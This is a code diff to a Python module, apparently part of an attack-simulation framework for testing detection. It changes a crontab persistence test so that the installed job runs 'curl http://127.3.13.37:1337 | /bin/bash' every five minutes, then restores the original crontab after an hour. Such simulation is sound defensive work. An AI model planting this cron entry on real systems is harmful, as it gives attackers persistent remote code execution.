@@ -6,23 +6,51 @@ except ImportError:
 class CrontabEntry(ModuleBase):
     @property
     def relative_delay(self):
-        return 80
+        return 30
 
     @property
     def absolute_duration(self):
-        return 3600  # 1 hour
+        return 60 * 60  # 1 hour
 
-    def run(self):
+    def do_run(self):
         self.start()
         import time
         from subprocess import Popen, PIPE
-        cmd = '(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/sleep 1  ### {0}") | crontab -'.format(self._banner)
+        job = r'echo "*/5 * * * * /bin/bash -c \"curl http://127.3.13.37:1337 | /bin/bash\" ### {0}"'.format(self._banner)
+        cmd = '(crontab -l 2>/dev/null; {0}) | crontab -'.format(job)
+
+        # Get original crontab
         try:
-            Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
+            p = Popen('crontab -l', stdout=PIPE, shell=True)
+            original_crontab, _ = p.communicate()
         except Exception as e:
-            self.hec_logger(str(e), severity='error')
+            self.hec_logger('Error getting crontab', severity='error', error=str(e))
+            return
+        p.wait()
+
+        # Modify crontab
+        try:
+            p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
+        except Exception as e:
+            self.hec_logger('Error adding entry to crontab', error=str(e), severity='error')
+            return
         else:
             self.hec_logger('Added a crontab entry', command=cmd)
-            time.sleep(self.absolute_duration)
-            # TODO : remove crontab entry
+        p.wait()
+
+        time.sleep(self.absolute_duration)
+
+        # Cleanup crontab
+        try:
+            p = Popen('echo -n \'{0}\' | crontab -'.format(original_crontab), stdout=PIPE, shell=True)
+            p.communicate(original_crontab)
+            p.wait()
+        except Exception as e:
+            self.hec_logger('Error resetting crontab', severity='error', error=str(e))
+        else:
+            self.hec_logger('Crontab reset to original entries')
+
+    def run(self):
+        self.start()
+        self.do_run()
         self.finish()
